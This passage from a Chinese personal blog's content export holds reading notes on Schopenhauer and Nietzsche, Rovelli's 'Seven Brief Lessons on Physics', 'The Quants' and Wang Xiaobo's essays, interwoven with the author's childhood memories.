动物没有理性，可是动物生下来就知道觅食、交配、躲避危险，在很多情况下比人的求生能力还要强。动物这么强大的生存能力哪儿来的呢？叔本华认为，这是背后的生命意志驱使的。生命意志的概念比一般的生物欲望还要宽泛，还包括没有生命的事物在内。叔本华认为，宇宙中万事万物背后都有生命意志在驱动。小到磁石相吸，大到星球运行，背后的本质原因都是生命意志。在叔本华看来，生命意志是世界上最本质的东西，是不可抗拒的，是永不停歇的。 因为物自体是非理性的，所以生命意志也是非理性的，也就是盲目的。 对于人来说，生命意志主要表现在人的生存欲望。</p><p>我们可以打个比方：意志是个充满欲望的君王，但是它头脑糊涂，只知道发布命令，不知道该怎么去更好地达到目的。理性是个头脑清醒的老臣，它虽然对君王的命令有意见，但是限于身份，只能偶尔劝谏君王，大部分时候都是在用它的聪明才智去满足君王的欲望。理性不是没有用，只是实现意志的工具而已。</p><p><strong>我们平时和别人发生了争执，我们说服别人用的是理性吗？绝大多数时候，靠的不是理性而是利益。</strong>比如邻居乱堆杂物占了我们家地方，有几个平常人能用逻辑、用“不侵占公共空间的善是一种普世道德”去说服邻居呢？真正能说服别人的，靠的是利益的威胁（再占我们家地方我就告居委会去）和诱惑（您说咱邻里公平和睦地生活多好啊）来说服对方。</p><p>所以在康德看来，理性就是我们这个世界的统治者。没错，理性确实管不了物自体，但是物自体也不影响我们的世界呀。叔本华说，不，物自体能影响我们的世界。不仅能影响，而且影响力超大，我们用理智控制不了。 在康德那里，这个世界的基础是井井有条的理性。 在叔本华这里，这个世界的基础是无法控制的生命意志。<strong>因此康德对世界的看法是乐观的。 叔本华对世界的看法是悲观的。</strong></p><p>叔本华也不看好爱情。在他看来，爱情是生命意志为了引诱人们生殖下一代所行使的骗术。为了爱情而结婚是非常傻的行为。既然是骗术，那么爱情也不会持久，早晚会幻灭，追求永恒的爱情是徒劳的。因此，如果非要结婚的话，还不如出于功利目的结婚的好。<br>那么什么办法管用呢？叔本华认为，应当增强自己克制欲望的意志力。 所有需要克制的欲望中，首要的是性欲。 我们的很多行为受到性欲的驱使，性欲满足的目的是为了诞生新的生命。而新的生命又意味着新的痛苦。所以叔本华认为，生殖行为就好像人和生命意志签订的卖身契。因此在人类社会里性行为总和可耻相连。（我想社会学家不会同意这句话。）那么意志该怎么控制欲望呢？ 叔本华认为，我们可以提高自己对这世界的认识（当然是去认识叔本华所理解的那个世界），增强我们的理性，用理性抑制和控制感性冲动。然后，把自己的感情和欲望上升为全人类的感情和欲望，这样就可以尽量消除个人的欲望。接下来，我们要强迫自己不去做想做的事，反而去做不想做的事，抛弃一切现实的理想。像苦行僧一样地修行，通过苦行来抑制生命意志。不反对别人损害自己，欣然接受任何损失，把这当作考验自己战胜生命意志的机会。最终欣然接受死亡。<br><strong>古典乐的力量：在所有的艺术中，叔本华最推崇音乐。当然，他喜欢的都是他那个年代的流行音乐——也就是我们今天的古典音乐。我们今天投入地听古典音乐，的确会感到心旷神怡，能把各种欲望、名利、贪心都暂时抛到一边。</strong></p><p>佛教不同，佛教认为欲望是痛苦的来源，主张彻底摒弃一切欲望。这和叔本华的观点很像。这不是巧合，叔本华的哲学观点深受印度佛教的影响。<strong>据说他的书桌上经常摆放的是一尊康德像和一尊佛像。</strong></p><p>叔本华强调非理性的欲望比理性对人的影响更大，这和后来的弗洛伊德心理学强调潜意识的观点很像。但现在的心理学一般认为，潜意识虽然会影响我们，但没有叔本华的生命意志那么无孔不入，人类理性的控制力还是很强的。<br>悲观主义对于我们来说仍旧有现实意义。首先，叔本华的悲观主义从某些角度上看确实是成立的。虽然说理性未必就会败给欲望，但对于大部分人来说，欲望的确是生活的主题。我们是为了获得尽可能多的安全感，为了有更好的物质享乐，为了和别人攀比，才会去忍受无穷无尽的艰辛劳动和在各种挫折中的垂头丧气。大部分人这一辈子活着，为的都是满足各种各样的欲望。我们也同意，欲望是永远不会被满足的。满足了就会产生新的欲望，不满足就会产生饥渴感。所以叔本华的世界观对于大部分人来说，是对的、没问题的。 叔本华提出的解决方案也没问题：<strong>既然满足欲望是一条不归路，那我们就应该早点看清这一点，不再去满足欲望。但欲望不满足我们会饥渴痛苦啊，那就可以像叔本华建议的那样，用无关欲望的对艺术品的欣赏来获得暂时解脱。这也是被社会普遍接受的生活观。</strong></p><p>叔本华不信任朋友。他说：“凡是对敌人保密的事也要对朋友保密。”他甚至刻薄地说：“患难朋友并不是真朋友，他不过是个借钱人。”<br><strong>自由意志：</strong>前面说过，我们很害怕没有<strong>自由意志</strong>。没有自由意志，我们就如同牵线木偶一样，自己不能控制自己。那什么叫“自己控制自己”呢？ 比如有一天，你喝多了，脑子浑浑噩噩，失去了理性。结果你碰见喜欢的姑娘，把人家姑娘给亲了。第二天，你特别后悔，赶紧给姑娘打电话说：“昨天真对不起，昨天我没控制住自己。”昨天你为什么没控制住自己呢？ 因为你在酒精和性欲的作用下，失去了理性。 所以“控制”自己，靠的也是理性。 没有了理性，我不能控制自己，也就等于没有自由意志了。</p><p>这是两个常被误解的人：叔本华，一般人以为他是一个悲天悯人的慈祥老头。不！生活中他暴躁刻薄。 尼采，一般人以为他是一个放荡不羁的狂人——不，生活中他是一个温和的智者。<br><strong>尼采</strong>继承了叔本华的形而上学。叔本华说物自体是<strong>“生命意志”</strong>，尼采给改造成了<strong>“权力意志”</strong>。“权力意志”一词中的“权力”容易引起误解。这并不是政治权力的意思，而是指要让自己变得更强大、更强壮、更富创造力的欲望。</p><p>尼采把人分成了强者和弱者。强者体现了权力意志，他们的特征是积极向上、勇于进取、勇于牺牲、善于创造。弱者相反，特点是胆小、保守、善妒、虚伪。传统欧洲人相信基督教的普世精神和卢梭的人文主义，两者强调的都是对弱者的关怀，强调人人平等。 尼采不同意。</p><p>尼采认为，奴隶道德和贵族道德最明显的区别在于：奴隶道德总是在禁止，不许人们做这做那；贵族道德则是在鼓励人们自由创造。</p><p>有句话说：“中国人本来就穷，可身上的虱子还分三六九等。”在生活中给我们最大痛苦的，往往不是那些有大权力的强者，而是掌握了小权力的弱者。所谓“阎王好见，小鬼难缠”，“小鬼”处境越卑微，能力越弱，在掌握了权力以后就越会肆无忌惮，越心狠手辣，越愿意欺凌比他还弱小的人。在现实生活中，让我们活得好好的突然一瞬间起杀人念头的，大都是这种“小鬼”。</p><p>尼采和叔本华一样，认为这世界是悲观的。但他的解决方法和叔本华不同。尼采的世界观带有强烈的激情，他认为叔本华的禁欲是胆小者的逃避行为。他觉得人不应该像叔本华宣扬的那样避免痛苦，而是应该承认痛苦，迎战痛苦。简而言之，尼采推崇的是一种<strong>精英主义</strong>。</p><p>尼采说：真理就是一种如果离开它、某种生物便不能活的错误。</p><p>当然，现代社会的价值观是多元的，除了崇拜成功外，也有推崇人性、亲情的，也有对拜金主义的批判和反思，这样的文艺作品也不少。但是，<strong>推崇成功是现代社会和过去的基督教社会最大的区别之一，是西方社会价值观最大的变革之一。</strong>在这个背景下看，尼采自然会赢得西方社会的广泛接受，甚至可以算是一个预言家。<br><strong>尼采歧视的女性：</strong>最后再说一下，尼采和叔本华有一个共同之处，他们都鄙视女性。<br>尼采歧视女人，或许是因为他觉得女人不会成为强者吧。不过这么说也够亏心的，他一生全赖女人的照料。尤其是他的母亲。尼采的父母都是虔诚的教徒，尼采攻击基督教的言论深深地伤害了母亲，但她一直都全心全意地呵护照料着自己的爱儿。</p><p>我们之前在说斯宾诺莎的时候提到，越是生活痛苦的人越关心个人幸福。克尔凯郭尔的遭遇如此痛苦，可以想象，他对个人幸福、个人命运会有多么关心！他又受到他父亲的影响，非常关注信仰。</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
          <category> Philosophy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>《七堂极简物理课》</title>
      <link href="/2018/02/16/%E4%B8%83%E5%A0%82%E6%9E%81%E7%AE%80%E7%89%A9%E7%90%86%E8%AF%BE/"/>
      <url>/2018/02/16/%E4%B8%83%E5%A0%82%E6%9E%81%E7%AE%80%E7%89%A9%E7%90%86%E8%AF%BE/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《七堂极简物理课》</p><p>第一课：最美的理论</p><p>爱因斯坦 广义相对论 </p><p>“牛顿试图解释物体下落和行星运转的原因。他假设在万物之间存在一种相互吸引的“力量”，他称之为“引力”。那么这个力是如何牵引两个相距甚远，中间又空无一物的物体的呢？这位伟大的现代科学之父对此显得谨慎小心，未敢大胆提出假设。牛顿想象物体是在空间中运动的，他认为空间是一个巨大的空容器，一个能装下宇宙的大盒子，也是一个硕大无朋的框架，所有物体都在其中做直线运动，直到有一个力使它们的轨道发生弯曲。至于“空间”，或者说牛顿想象的这个可以容纳世界的容器是由什么做成的，牛顿也没有给出答案。就在爱因斯坦出生前的几年，英国的两位大物理学家——法拉第（ Michael Faraday）和麦克斯韦（ James Maxwell）——为牛顿冰冷的世界添加了新鲜的内容：电磁场。所谓“电磁场”，是一种无处不在的真实存在，它可以传递无线电波，可以布满整个空间；它可以振动，也可以波动，就像起伏的湖面一样；它还可以将电力“四处传播”。爱因斯坦……很快他想到，就像电力一样，引力一定也是由一种场来传播的，一定存在一种类似于“电场”的“引力场”。他想弄明白这个“引力场”是如何运作的，以及怎样用方程对其进行描述。就在这时，他灵光一闪，想到了一个非同凡响的点子，一个百分百天才的想法：引力场不“弥漫”于空间，因为它本身就是空间。这就是广义相对论的思想。其实，牛顿的那个承载物体运动的“空间”与“引力场”是同一个东西。这是一个惊世骇俗的理论，对宇宙做了惊人的简化：空间不再是一种有别于物质的东西，而是构成世界的“物质”成分之一，一种可以波动、弯曲、变形的实体。我们不再身处一个看不见的坚硬框架里，而更像是深陷在一个巨大的容易形变的软体动物中。太阳会使其周围的空间发生弯曲，所以地球并不是在某种神秘力量的牵引下绕着太阳旋转，而是在一个倾斜的空间中行进，就好像弹珠在漏斗中滚动一样：漏斗中心并不会产生什么神秘的“力量”，是弯曲的漏斗壁使弹珠滚动的。所以无论是行星绕着太阳转，还是物体下落，都是因为空间发生了弯曲。那么我们该如何描述这种空间的弯曲呢？ 19世纪最伟大的数学家、“数学王子”卡尔·弗里德里希·高斯（ Carl Friedrich Gauss）已经写出了描述二维曲面（比如小山丘的表面）的公式。他还让自己的得意门生将这一理论推广到三维乃至更高维的曲面。这位学生就是波恩哈德·黎曼（ Bernhard Riemann），他就此问题写了一篇重量级的博士论文，但当时看起来全然无用。黎曼论文的结论是，任何一个弯曲空间的特征都可以用一个数学量来描述，如今我们称之为“黎曼曲率”，用大写的“ R”来表示。后来爱因斯坦也写了一个方程，将这个 R与物质的能量等价起来，也就是说：空间在有物质的地方会发生弯曲。就这么简单。这个方程只有半行的长度，仅此而已。空间弯曲这个观点，现在变成了一个方程。然而，这个方程中却蕴含着一个光彩夺目的宇宙。首先，这个方程描述了空间如何在恒星周围发生弯曲。由于这个弯曲，不仅行星要在轨道上绕着恒星转，就连光也发生了偏折，不再走直线。爱因斯坦预测，太阳会使光线偏折。在 1919年，这个偏折被测量出来，从而证实了他的这一预测。其实不仅是空间，时间也同样会发生弯曲。爱因斯坦曾预言，在高空中，在离太阳更近的地方，时间会过得比较快，而在低的地方，离地球近的地方时间则过得比较慢。这一预测后来也经测量得到了证实。</p><p>当一个大恒星燃烧完自己所有的燃料（氢）时，它就会熄灭。残留的部分因为没有燃烧产生的热量的支撑，会因为自身的重量而坍塌，导致空间强烈弯曲，最终塌陷成一个真真正正的洞。这就是著名的“黑洞”。……整个宇宙空间可以膨胀和收缩。爱因斯坦的方程还指出，空间不可能一直保持静止，它一定是在不断膨胀的。……这个方程还预测，这个膨胀是由一个极小、极热的年轻宇宙的爆炸引发的：这就是我们所说的“宇宙大爆炸”。……但大量证据纷纷出现在我们眼前，直至在太空中观测到了“宇宙背景辐射”，也就是原始爆炸的余热里弥漫的光。事实证明，爱因斯坦方程的预言是正确的。此外，这个理论还说，空间会像海平面一样起伏，目前人们已经在宇宙中的双星上观测到了“引力波”的这种效应，与爱因斯坦理论的预言惊人一致，精确到了千亿分之一。……所有这一切都源自一个朴素的直觉，那就是，空间和引力场本是一回事。这一切也可以归结为一个简洁的方程，……”</p><p>第二课 量子</p><p>量子力学诞生于1900年，……德国物理学家马克思·普朗克（Max Planck）计算了一个“热匣子”内处于平衡态的电磁场。为此他用了一个巧妙的办法：假设电磁场的能量都分布在一个个“量子”上，也就是说能量是一包一包或一块一块的。用这个方法算出的结果与测量得到的数据完全吻合（所以应该算是正确的），但却与当时人们的认知背道而驰，因为人们认为能量是连续变动的，硬把它说是由一堆“碎砖块”构成的，简直是无稽之谈。</p><p>对于普朗克来说，把能量视为一个个能量包块的集合只是计算上使用的一个特殊策略，就连他自己也不明白为什么这种方法会奏效。然而五年后，有事爱因斯坦，终于认识到这些“能量包”是真是存在的。</p><p>爱因斯坦指出光是由成包的光粒子构成的，今天我们称之为“光子”。他在那篇文章的引言中写道：“在我看来，如果我们假设光的能量在空间中的分布是不连续的，我们就能更好地理解有关黑体辐射、荧光、紫外线产生的阴极射线，以及有关其他有关光的发射和转化的现象。依据这个假设，点光源发射出的一束光线的能量，并不会在越来越广的空间中连续分布，而是由有限数目的‘能量量子’组成，它们在空间中点状分布，作为能量发射和吸收的最小单元，能量量子不可再分。”</p><p>20世纪10-20年代，丹麦人尼尔斯·波尔（Dane Niels Bohr）引领了这一理论的发展，他了解到原子核内电子的能量跟光能一样，只是特定值，而更重要的是，电子只有在特定的能量之下才能从一个原子轨道“跳跃”到另一个原子轨道上，并同时释放或吸收一个光子，这就是著名的“量子跃迁”。 </p><p>1925年，量子理论的方程终于出现了，取代整个牛顿力学。</p><p>率先为这个新理论列出方程的是一个非常年轻的德国天才——维尔纳·海森堡（Werner Heisenberg），他所依据的理念简直让人晕头转向。</p><p>海森堡想象电子并非一只存在，只有人看到它们的时，或者更确切的说，只有和其他东西相互作用时它们才会存在。当它们与其他东西相撞时，就会以一个可计算的概率在某个地方出现。从一个轨道到另一个轨道的“量子跃迁”是它们现身的唯一方式：一个电子就是相互作用下的一连串跳跃。如果么有受到打扰，电子就没有固定的栖身之所，它甚至不会存在于一个所谓的“地方”。</p><p>在量子力学中，没有一样东西拥有确定的位置，除非它撞上了别的东西。为了描述电子从一种相互作用到另一个相互作用的飞跃，就要借助一个抽象的公式，它只存在于抽象的数学空间，而不存在于真实空间。</p><p>更糟的是，这些从一处到另一处的飞跃大多是随机的，不可预测的。我们无法预知一个电子再次出现会是在哪儿，只能计算它出现在这里或那里的“概率”。这个概率问题直捣物理的核心，可原本物理学的一切问题都是被那些普遍且不可改变的铁律所控制的。</p><p>一个世纪过去了，我们还停在原点。量子力学的方程以及用它们得出的结果每天都被应用于物理、工程、化学、生物乃至更广阔的领域中。量子力学对于当代科技的整体发展有着至关重要的意义。没有量子力学就不会出现晶体管。然而这些方程仍然十分神秘，因为它们并不描述在一个物理系统内发生了什么，而只说明一个物理系统是如何影响另外一个物理系统的。</p><p>第三课 宇宙的构造</p><p>20世纪上半叶，爱因斯坦用相对论描述了空间和时间的运作方式，而波尔和他年轻的门徒们则用一系列方程捕捉到了物质奇怪的量子特性。20世纪下半叶，物理学家们在此基础上，把这两个新理论广泛应用在了自然界的各个领域：从宏观世界的宇宙构造，到微观世界的基本粒子。</p><p>哥白尼的日心说</p><p>太阳系只是不计其数的星系中的一个，而我们的太阳也只是众多恒星中普普通通的一颗，是浩瀚银河系星云中的沧海一粟。</p><p>但是在20世纪30年代，天文学家对星云（恒星之间近乎白色的云团）进行精确的测量后发现，银河系本身也只是众多星系间浩瀚星云中的一粒尘埃。这些星系一只蔓延到我们最强大的天文望远镜也看不到的地方。</p><p>这片均匀无边的宇宙并不像看上去那么简单。就像我在第一节课中解释过的那样，空间不是一马平川，而是弯曲的。宇宙布满了星系，所以我们想象它的纹理会像海浪一样起伏，激烈处还会产生黑洞空穴。</p><p>我们今天终于知道，这个布满星系、富有弹性的浩瀚宇宙是大约150亿年前由一个极热极密的小星云演化来的。</p><p>宇宙的诞生的时候就像一个小球，大爆炸后一直膨胀到它现在的规模。这就是我们现在对宇宙最大程度的了解了。</p><p>第四课 粒子</p><p>我们身边所有物体都是由电子、夸克、光子和胶子组成的。它们就是粒子物理学中所讲的“基本粒子”。除此之外还有几种粒子，例如中微子（neutrino）——它布满整个宇宙，但并不跟我们发生交互作用，还有希格斯玻色子（Higgs boson）——不久前日内瓦欧洲核子研究中心的大型强子对撞机发现的粒子。但这些粒子并不多，只有不到十种。这些少量的基本原料，如同大型乐高玩具中的小积木，靠它们建造出了我们身边的整个物质世界。</p><p>量子力学描述了这些粒子的性质和运动方式。这些粒子当然并不像小石子那般真实可感，而是相应的场的“量子”，比方说光子是电磁场的“量子”。就跟在法拉第和麦克斯韦的电磁场中一样，它们是这些变化的基底场的元激发，是极小的移动的波包。它们的消失和重现遵循量子力学的奇特定律：存在的每样东西都是不稳定的，永远都在从一种相互作用跃迁到另一种相互作用。</p><p>即使我们观察的是空间中一块没有原子的区域，还是可以探测到粒子的微小涌动。彻底的虚空是不存在，就像最平静的海面，我们凑近看还是会发现细微的波动和振荡。构成世界的各种场也会轻微的波动起伏，我们可以想象，组成世界的基本粒子在这样的波动中不断产生、消失。</p><p>这就是量子力学和粒子理论描述的世界。这同牛顿和拉普拉斯（Laplace）的世界相去甚远：在那里，冰冷的小石子在不变的集合空间里沿着精确而漫长的轨迹永恒不变地运动着。量子力学和粒子试验告诉我们，世界是物体连续、永不停歇的涌动，是稍纵即逝的实体不断出现和消失，是一系列的振荡，就像20世界60年代时髦的嬉皮时代，一个由事件而非物体构成的世界。</p><p>第五课 空间的颗粒</p><p>“圈量子引力”试图将广义相对论和量子力学统一起来。</p><p>它的中心思想很简单。广义相对论告诉我们空间不是一个静止的盒子，而是在不断运动，像一个移动中的巨大软体动物，可以压缩和扭曲，而我们被包在里面。另一方面，量子力学告诉我们，所有这样的场都“由量子构成”，具有精细的颗粒状结构。于是物理空间当然也是“由量子构成的”。</p><p>这正是圈量子引力的核心结论：空间是不连续的，不可被无限分割，而是由细小的颗粒，或者说“空间原子”构成。这些颗粒极其微小，比最小的原子核还要小几亿亿倍。圈量子引力用数学形式描述了这些“空间原子”，也给出了它们演化的方程。它们被称为“圈”或环，因为它们环环相扣，形成了一个相互关联的网络，从而编制出空间的纹理，就像细密织成的巨大锁子甲上的小铁圈一样。</p><p>第六课 概率、时间和黑洞的热</p><p>英国物理学家麦克斯韦和奥地利物理学家玻尔兹曼（Ludwig Boltzmann）发现了热的本质。</p><p>玻尔兹曼发现其中的原因惊人的简单：这完全是随机的。玻尔兹曼的解释非常精妙，用到了概率的概念。热量从热的物体跑到冷的物体并非遵循什么绝对的定律，只是这种情况发生的概率比较大而已。原因在于：从统计学的角度看，一个快速运动的热物体的原子更有可能撞上一个冷物体的原子，传递给它一部分能量；而相反过程发生的概率则很小。在碰撞的过程中能量是是守恒的，但当发生大量偶然碰撞时，能量倾向于平均分布。就这样，相互接触的物体温度趋向于相同。热的物体和冷的物体接触后温度不降反升的情况并非不可能，只是概率小的可怜罢了。</p><p>尾声 我们</p>]]></content>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>宽客：华尔街顶级数量金融大师的另类人生</title>
      <link href="/2018/02/12/%E5%AE%BD%E5%AE%A2%EF%BC%9A%E5%8D%8E%E5%B0%94%E8%A1%97%E9%A1%B6%E7%BA%A7%E6%95%B0%E9%87%8F%E9%87%91%E8%9E%8D%E5%A4%A7%E5%B8%88%E7%9A%84%E5%8F%A6%E7%B1%BB%E4%BA%BA%E7%94%9F/"/>
      <url>/2018/02/12/%E5%AE%BD%E5%AE%A2%EF%BC%9A%E5%8D%8E%E5%B0%94%E8%A1%97%E9%A1%B6%E7%BA%A7%E6%95%B0%E9%87%8F%E9%87%91%E8%9E%8D%E5%A4%A7%E5%B8%88%E7%9A%84%E5%8F%A6%E7%B1%BB%E4%BA%BA%E7%94%9F/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本书讲述了一场以可怕的失败告终的资本市场实验，在20世纪90年代和21世纪的第一个十年里，买卖、包装复杂证券的技术风靡美国和欧洲。人们建新数学和计算机可以保护投资者免受不利事件的冲击，但事实证明，人们被引入了歧途。这一次信念蒙蔽了专家的眼睛，让他们对所承担的真实风险视而不见。</p><p>本书也描述了金融创新以及新崛起的势力：数学和计算机专家是如何扩展市场、增加市场稳定性，从而为更多的人带去财富和荣华富贵的。量化投资如果应用得当，通常可以令市场更有效、更健康。</p><p>总而言之，这是一场平衡游戏。量化投资也是世界上最给力、最成功的投资方法，但也可以导致可怕的错误，滋生灾难性的自满。宽客必须意识到，世界并不总是风平浪静的，人类情绪可以造成他们始料未及的市场波动。<br><a id="more"></a></p>]]></content>
      
      <categories>
          
          <category> 随想 </category>
          
          <category> Baseball </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一只特立独行的猪</title>
      <link href="/2018/02/11/%E4%B8%80%E5%8F%AA%E7%89%B9%E7%AB%8B%E7%8B%AC%E8%A1%8C%E7%9A%84%E7%8C%AA/"/>
      <url>/2018/02/11/%E4%B8%80%E5%8F%AA%E7%89%B9%E7%AB%8B%E7%8B%AC%E8%A1%8C%E7%9A%84%E7%8C%AA/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>王小波的书<br><a id="more"></a></p><p>《一只特立独行的猪》</p><p>将近一个月的时间里断断续续的阅读完这本书，不得不说有些囫囵吞枣，但我本人又是一个兴趣导向的人，能断断续续的把这本书读完，排除自吹自擂的成分，确实说明这本书比较符合我的胃口。<br>此书由一个个小故事编排，时间不长，阅读随意。此时已经距离王小波先生写此书过去十多年，但我任感慨于王小波先生，敏锐的观察力和洞察力，文科部分不是我的专长，不好菲薄，但其中理科特别是零星科技的见解却符合这十多年的发展，作者阅读适应的文章，做出适应的见解，这似乎印证了，随机观点，小概率的阅读，引发大概率的观点。<br>能想来，许多内容在当时应该出格叛逆，当时在如今时代看来却有网络作者的风格，这也是一种时代的进步吧<br>在这本书中，体现了王小波先生丰富的人生阅历和当时看来深刻的思索，但愿也能有机遇体会到王先生的感悟。<br>书中有一章《海明威&lt;老人与海&gt;》<br>“那么，什么也没有得到的老人竟是胜利者？我确是这样看的。我认为，胜利就是战斗到最后的时候。老人总怀着无比的勇气走向莫测的大海，他的信心是不可战胜的。<br>他和其他许多人一样，是强悍的人类的一员。我喜欢这样的人，也喜欢这样的人性，我发现，人们常常那这样的事情当做人性最可贵的表露：七尺男子汉坐在厨房里和三姑六婆磨嘴皮子，或者衣着笔挺的男女们坐在海滨，谈论着高尚的。别人不能理解的感情。我不喜欢人们像这样沉溺在人性的软弱的部分之中，更不喜欢人们总这样描写人性。<br>正像老人每天走向大海一样，很多人每天也走向与他们的限度斗争的战场，仿佛他们要与命运一比高低似的。他们是人中的强者。<br>人类本身有自己的限度，但是当人们一再把手伸到限度以外，这个限度就一天一天地扩大了。人类在预先的斗争中成长。他们把飞船送上太空，他们也用简陋的渔具在加勒比海捕捉巨大的马林鱼。这些事情是同样伟大的。做这样不可思议的事情的人都是英雄。而那些永远不肯或不能超越自己限度的人是平庸的人。<br>在人类前进的道路上，强者与弱者的命运是不同的。弱者不羡慕强者的命运，强者也讨厌弱者的命运。强者带有人性中强悍的一面，弱者带有人性中软弱的一面。强者为弱者开辟道路，但是强者往往为弱者所奴役，就像是老人为大腹便便的游客打鱼一样。<br>《老人与海》讲了一个老渔夫的故事，但是在这个故事里却揭示了人类的共同命运。我佩服老人的勇气，佩服他不屈不挠的斗争精神，也佩服海明威。”</p><p>《关于“媚雅”》<br>“前不久在报纸上看到一篇文章，谈到“媚俗”和“媚雅”的问题。作者认为，米兰•昆德拉用出来一个词儿，叫做“媚俗”，是指艺术家为了取悦大众，放弃了艺术的格调。他还说，我们国内有些小玩闹造出个新词“媚雅”，简直不知是什么意思。这个词的意思我是知道，是指大众受到某些人的蛊惑或者误导，一味追求艺术的格调，也不问问自己是不是消受得了。在这方面，我有些经验，都与欣赏音乐有关。高雅音乐高调很高，大概没有疑问。我自己在音乐方面品味很低，乡村音乐还有听得住，再高就受不了。”</p><p>《诚实与浮嚣》<br>“人忠于已知事实叫做诚实，不忠于事实叫做虚伪。还有些人只忠于经过选择的事实，这既不叫诚实，也不叫虚伪，我把它叫做浮嚣。”</p><p>《工作与人生》<br>这是书中最后一章，前面还有96、97年《写给新的一年》。</p><p>“人活在世上，不但有身体，还有头脑和心胸——对此请勿从解剖学上理解。人脑是怎样的一种东西，科学还不能清楚。心胸是怎么一回事就更难说清。对我自己来说，心胸是我在生活中想要达到的最低目标，某件事有悖于我的心胸，我就认为它不值得一做；某个人有悖于我的心胸，我就觉得他不值得一交；某种生活有悖于我的心胸，我就会以为它不值得一过。罗素先生曾言，对人来说，不加检点的生活，确实不值得一过。我同意他的意见：不加检点的生活，属于不能接受的生活之一种。人必须过他可以接受的生活，这恰恰是他改变一切的动力。人有了心胸，就可以用它来改变自己的生活。”<br>深以为然。</p><p>“中国人喜欢接受这样的想法：只要能活着就是好的，活成什么样子无所谓。从一些电影的名字就可以看出来，《活着》、《找乐》……我对于这种想法是断然地不赞成，因为抱有这种想法的人就可能活成任何一种糟糕的样子，从而使生活本身失去意义。高尚、清洁、充满乐趣的生活是好的。人们很容易得到共识、但只有这两条远远不够。我以写作为生，我知道某种文章好，也知道某种文章坏。仅知道这两条尚不足以开始写作。还有更重要的一条，那就是：某种样子的文章对我来说是不可取的，决不能让它从我笔下写出来，冠以我的名字登在报刊上。以小喻大，这也是我的生活态度。”</p><p>只写确定无误的事情，不写旁门左道疑问重重的事情<br>《我的精神家园》<br>小时候，我曾对许多事情有很强烈的好奇心，就将少儿百科全书拿来阅读，有些内容今日看来十分错误，但在当时却深信不疑。比如UFO等，小时候不像王先生那么博闻多智，曾看鲁西西皮皮鲁等，小时候也成看什么魔方大厦现在感觉十分恐怖，但在当时却感到十分曲折，弯弯绕绕太多，这些在我心里倒也没有留下许多阴影。</p><blockquote><p>我为什么要写作》<br>小时候，看见我的姥姥写的一手好钢笔字，这里说一下，我的姥姥是个小学老师，就是那个台湾国民党连战的小学（后来还专门回来小学看过，学校也是花了十几万整理下门前道路，算是迎接连主席的面子工程吧），后来给学校写校史，小时候感觉姥姥最骄傲的事情，就是她说，她写的校史连一个字都没改过，而且这校史还是她老人家一个字一个字钢笔写出来的，最后锁在学校里。而我的姥爷是个会计，但也是个很体面的会计，跟外国文学里绅士有点类似，无论何时何地见何人，每天早上醒来，必然梳洗一番，换假牙，用发胶将头发梳的一丝不苟，连鬓角也不放过，永远喜欢涤纶的衣服因为笔挺，冬天喜欢卓别林的帽子围巾，大衣，从小就觉得很酷，跟个特务一般，姥爷退休后喜欢书法，自己钻研隶书，算是有所小成，周围有人求字也是欣然挥墨，不过，在书法上也被人骗过，有人冒充书法协会要姥爷入会员，要求姥爷的字和会费，明显后者才是目的，但是姥爷也是确信不疑，家人劝阻全然不顾，大有古人虽万人劝阻，吾亦往亦的架势，上当几次后也是明白过来，再接到同样书信自嘲都是骗子，但是却有杂志将姥爷的字刊登出来，还寄了基本样本回来，都被姥爷宝贝般的收藏起来。<br>小学作文常常被当做范文也是受到姥姥的影响吧，姥爷无论何时何地熨帖的发胶总是给我留下深刻的印象。</p><p>我的师承<br>数学，小时候盛行奥数，小学四五年级就开始上奥数班，一开始几个没多大印象，印象最深的是一个叫刘立新的老师，他是教育学院的老师，就是给老师上课的老师，估计是个大学讲师吧（小学奥数就是个大学讲师上课，确实有点高规格），他在博物馆对面租个研究所厂区，周六日四个半天不停歇，每个班上半天课，他上课颇有些心意，他自己编题，不过都是有根源的，几百道题印在几十页纸上，只有题，没有其他任何东西，怎么上课也有新意，讲个题目意思解决语文理解的问题，有时什么都不讲，学生自己做，做出来的举手，等有一半做出来的就开始讲题，反正学生是很竞争了，过段时间还分班，举手越快的做的越靠前。所以第一排就是一些看见题什么都不用讲自己就能做出来的学生，我当时也是坐在中间吧，对前排学生不是羡慕，而是一种膜拜，一个小学生就已经独立完成当时高中难度的题目，还不用讲解，估计都是清华北大的苗子吧，感慨神人再世，后来小学毕业，也就结束了，后来这批人中的某些继续跟着刘老师升到初中难度，我是没有这种待遇了，虽然初中在数理化竞赛中都拿到名次，但我明白天外有天，人外有人。还有段时间是一个姓黄还是庄的老教授，神情狡黠，目光深邃，我们的材料也是他老人家用一种很规整却不是标准的字体书写，再用紫印纸，印在下面五六张上，而最上面几张效果最好，能拿到都是一种荣幸。<br>初中到高中，数学辅导一直是一个大学退休的教授辅导，所有教案都是老人亲笔书写，再复印几本，老人讲课十分细腻，所以有时我听得索然无味，可惜了高考数学太简单，这若干年的培养没有在试卷里发挥多大作用。不过老人严谨的态度后来对我的影响颇深，一笔一划，上下求索。</p></blockquote><p>《个人尊严》<br>“在国外时看到，人们对时事做出价值评判时，总是从两个独立的方面来进行：一个方面是国家或者社会的尊严，这像是时事的经线；另一个方面是人的尊严，这像是时事的纬线。回到国内，一条纬线就像是没有了，连尊严这个词也感到陌生。”<br>“提到尊严这个概念，我首先想到英文单词dignity，然后才想到相应的的中文词。在英文中，这个词不仅有尊严之义，还有体面、身份的意思。尊严不但指人受到尊重，它还是人价值之所在。从上古到现代，数以万计的中国人里，没